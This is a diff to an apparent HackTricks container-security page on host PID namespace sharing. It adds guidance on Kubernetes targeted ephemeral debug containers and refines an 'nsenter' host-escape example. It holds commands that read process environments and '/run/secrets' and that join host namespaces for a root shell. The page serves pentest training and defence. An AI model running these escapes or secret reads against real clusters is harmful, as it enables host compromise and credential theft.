@@ -73,6 +73,27 @@ tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
 find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
 ```
 
+### Targeted ephemeral containers in an existing Kubernetes Pod
+
+A Kubernetes identity allowed to modify `pods/ephemeralcontainers` can add a debugger to a running Pod even when `shareProcessNamespace` is unset. With `--target`, the debugger joins the named container's process namespace if the runtime supports namespace targeting. This grants a process view of that container, not the node's host PID namespace.<sup>[[5]](#references)</sup>
+
+The API uses a separate subresource, so review its `patch`/`update` rights rather than assuming ordinary Pod write permissions cover it.<sup>[[6]](#references)</sup>
+
+For a Pod and container within an authorized namespace, test the targeted view:<sup>[[5]](#references)[[6]](#references)</sup>
+
+```bash
+ns=default; pod=myapp; container=app
+kubectl auth can-i get pods -n "$ns"
+kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
+kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
+kubectl auth can-i create pods/attach -n "$ns"
+kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
+# In the debug shell: verify the target processes are actually visible.
+ps -ef
+```
+
+If the runtime does not implement targeting, the debugger may fail to start or remain in an isolated PID namespace.<sup>[[5]](#references)</sup> If targeting works, use the checks under [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing) to test `/proc/<pid>` access. Visibility is not permission to read the target's secrets or signal it: Unix credentials and procfs access checks still apply.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards also constrain privileged settings on ephemeral containers.<sup>[[7]](#references)</sup>
+
 ## Abuse
 
 If the host PID namespace is shared, an attacker may inspect host processes, harvest process arguments, identify interesting services, locate candidate PIDs for `nsenter`, or combine process visibility with ptrace-related privilege to interfere with host or neighboring workloads. In some cases, simply seeing the right long-running process is enough to reshape the rest of the attack plan.
@@ -116,20 +137,20 @@ These commands are useful because they answer whether `hidepid=1` or `hidepid=2`
 
 ### Full Example: host PID + `nsenter`
 
-Host PID sharing becomes a direct host escape when the process also has enough privilege to join the host namespaces:
+Host PID sharing can enable host escape when the process has the required capabilities to join the host namespaces and adopt the host process's root. `nsenter --root` (`-r`) is needed for the latter: changing the mount namespace alone does not change the caller's root directory.<sup>[[9]](#references)</sup> Accessing `/proc/1/root` is subject to a ptrace read check, while changing root requires `CAP_SYS_CHROOT` in the caller's user namespace.<sup>[[8]](#references)[[10]](#references)</sup>
 
 ```bash
 ps -ef | head -n 50
-capsh --print | grep cap_sys_admin
-nsenter -t 1 -m -u -n -i -p /bin/bash
+capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
+nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
 ```
 
-If the command succeeds, the container process is now executing in the host mount, UTS, network, IPC, and PID namespaces. The impact is immediate host compromise.
+If the command succeeds, the new shell uses the host mount, UTS, network, IPC, and PID namespaces and PID 1's root filesystem. Check the effective identity and access rather than assuming that PID visibility alone granted host privileges.<sup>[[9]](#references)</sup>
 
 Even when `nsenter` itself is missing, the same result may be achievable through the host binary if the host filesystem is mounted:
 
 ```bash
-/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
+/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
 ```
 
 ### Recent Runtime Notes
@@ -189,10 +210,18 @@ If you discover a container running with host PID sharing, do not treat it as a 
 
 
 
+
+
 ## References
 
 - [1] [runc security advisory: container escape via "masked path" abuse due to mount race conditions (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
 - [2] [Tool Release – insject: A Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
 - [3] [Linux man-pages 6.19 book](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
 - [4] [Share Process Namespace between Containers in a Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
+- [5] [Debug Running Pods](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
+- [6] [Ephemeral Containers KEP](https://www.kubernetes.dev/resources/keps/277/)
+- [7] [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
+- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
+- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
+- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
 {{#include ../../../../../banners/hacktricks-training.md}}
